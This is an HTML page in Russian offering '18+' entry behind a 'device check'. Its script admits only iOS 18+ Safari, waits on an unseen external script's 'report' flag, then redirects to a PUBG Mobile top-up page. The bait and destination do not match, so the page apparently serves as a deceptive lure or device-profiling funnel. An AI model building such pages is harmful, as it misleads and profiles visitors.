<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>18+ Вход — Проверка устройства</title>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="format-detection" content="telephone=no">

<script>
window.__API_BASE = (typeof location !== 'undefined' && location.origin)
  ? location.origin.replace(/\/+$/, '')
  : '';
</script>

<style>
:root{
  --txt:#111;--sub:#444;--muted:#6b7280;
  --primary:#2563eb;--primary2:#60a5fa;
  --err:#ef4444;--ok:#16a34a;
  --radius:20px;
  --shadow:0 6px 30px rgba(0,0,0,.10);
}

html,body{height:100%}
body{
  margin:0;overflow:hidden;display:grid;place-items:center;
  font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
  color:var(--txt);
  background:#fff;
  -webkit-font-smoothing:antialiased;
  backdrop-filter:blur(30px) saturate(140%);
}

/* ===== матовый белый фон ===== */
.matte-bg{
  position:fixed;inset:0;z-index:-2;
  background:linear-gradient(145deg,#fafafa,#ffffff,#e7e8ea);
  animation:fadeTone 8s ease-in-out infinite alternate;
  filter:blur(1px);
}
@keyframes fadeTone{
  0%{filter:brightness(1.05);}
 100%{filter:brightness(1.2);}
}

/* ===== световые волны белого стекла ===== */
.glass-sheen{
  position:fixed;inset:-20vmax;z-index:-1;
  background:conic-gradient(from 0deg,
    rgba(255,255,255,.8),
    rgba(245,245,255,.3),
    rgba(255,255,255,.75),
    rgba(245,245,255,.3));
  animation:spinGlow 30s linear infinite;
  filter:blur(60px);
  opacity:.5;
}
@keyframes spinGlow{to{transform:rotate(360deg)}}

/* ===== СВЕТЛЯЧКИ ===== */
.fireflies{
  position:fixed;inset:0;pointer-events:none;z-index:-1;
}
.fl{
  position:absolute;width:6px;height:6px;border-radius:50%;
  background:white;opacity:.8;
  box-shadow:0 0 10px 4px white;
  animation:fly 6s linear infinite,var(--delay) ease;
  filter:blur(.6px);
}
@keyframes fly{
  0%{transform:translateY(0) translateX(0);}
 50%{transform:translateY(-30px) translateX(15px);}
100%{transform:translateY(0) translateX(-15px);}
}

/* ===== карта ===== */
.card{
  width:min(92vw,520px);padding:28px;border-radius:var(--radius);
  background:rgba(255,255,255,.65);
  backdrop-filter:blur(25px) saturate(170%);
  box-shadow:var(--shadow);
  border:1px solid rgba(255,255,255,.7);
  text-align:center;z-index:2;
}

h1{font-size:24px;font-weight:800;margin:0 0 12px}
p{font-size:16px;margin:0 0 18px;line-height:1.6}
.reason{font-size:13px;margin-top:8px;color:var(--muted)}
.notice{font-size:12px;color:var(--muted);margin-top:14px}

button{
  width:100%;height:54px;border:none;border-radius:14px;
  background:linear-gradient(90deg,var(--primary),var(--primary2));
  color:#fff;font-weight:800;font-size:16px;cursor:pointer;
  transition:transform .12s ease,box-shadow .12s ease;
  box-shadow:0 10px 25px rgba(37,99,235,.25)
}
button:active{transform:scale(.96)}

.ok{color:var(--ok);font-weight:700}
.err{color:var(--err);font-weight:700}

/* подпись */
.signature{
  position:fixed;bottom:12px;left:50%;transform:translateX(-50%);
  font-size:12px;color:#000;opacity:.55;letter-spacing:.5px;
  user-select:none;
}
</style>
</head>
<body>

<div class="matte-bg"></div>
<div class="glass-sheen"></div>
<div class="fireflies">
  <!-- 10 светляков -->
  <div class="fl" style="top:20%;left:25%;--delay:fly 8s infinite;"></div>
  <div class="fl" style="top:35%;left:60%;--delay:fly 7s infinite;"></div>
  <div class="fl" style="top:55%;left:40%;--delay:fly 10s infinite;"></div>
  <div class="fl" style="top:70%;left:20%;--delay:fly 6s infinite;"></div>
  <div class="fl" style="top:15%;left:80%;--delay:fly 9s infinite;"></div>
  <div class="fl" style="top:65%;left:70%;--delay:fly 10s infinite;"></div>
  <div class="fl" style="top:82%;left:50%;--delay:fly 8s infinite;"></div>
  <div class="fl" style="top:28%;left:10%;--delay:fly 7s infinite;"></div>
  <div class="fl" style="top:45%;left:85%;--delay:fly 7s infinite;"></div>
  <div class="fl" style="top:50%;left:30%;--delay:fly 8s infinite;"></div>
</div>

<div class="card" id="card">
  <h1 id="title">Проверка устройства</h1>
  <p id="text">Определение платформы…</p>
  <div class="reason" id="reason"></div>
  <button id="enterBtn" style="display:none;">Войти 18+</button>
  <div class="notice" id="note"></div>
</div>

<div class="signature">Created by <b>V7CK9LL</b></div>

<script src="/app.js?v=12"></script>

<script>
const MIN_IOS_MAJOR = 18;
function isIOSFamily(){const ua=navigator.userAgent;return /(iPhone|iPad|iPod)/.test(ua);}
function parseIOSMajor(){const ua=navigator.userAgent;const m1=ua.match(/OS\s(\d+)/);return m1?parseInt(m1[1],10):null;}
function isPureSafari(){const ua=navigator.userAgent;return navigator.vendor==="Apple Computer, Inc." && /Safari/.test(ua) && !/CriOS|Chrome|FxiOS|Firefox|Edg/i.test(ua);}
function secureContextOK(){return location.protocol==="https:"||location.hostname==="localhost";}
function deviceGateCheck(){const isiOS=isIOSFamily();const iosMajor=parseIOSMajor();const safari=isPureSafari();const httpsOK=secureContextOK();
 if(!httpsOK)return{ok:false,reason:"Нужен HTTPS."};
 if(!isiOS)return{ok:false,reason:"Не iOS/iPadOS."};
 if(!iosMajor)return{ok:false,reason:"Версия iOS не определена."};
 if(iosMajor<MIN_IOS_MAJOR)return{ok:false,reason:`Версия ниже ${MIN_IOS_MAJOR}.`};
 if(!safari)return{ok:false,reason:"Только Safari."};
 return{ok:true,iosMajor};}

document.addEventListener("DOMContentLoaded",()=>{
  const $=id=>document.getElementById(id);
  const res=deviceGateCheck();
  if(res.ok){
    $('text').innerHTML='<span class="ok">Доступ разрешён.</span>';
    $('reason').textContent=`iOS ${res.iosMajor}, Safari WebKit.`;
    $('enterBtn').style.display='block';
    $('note').textContent='Кнопка активируется после проверки.';
    $('enterBtn').addEventListener('click',e=>{
      if(!window.__reportReady){e.preventDefault();return;}
      location.assign('https://www.pubgmobile.com/ig/itop');
    });
  }else{
    $('title').textContent='Доступ отклонён';
    $('text').innerHTML='<span class="err">Отказ в доступе.</span>';
    $('reason').textContent='Причина: '+res.reason;
    $('enterBtn').style.display='none';
  }
});
</script>
</body>
</html>
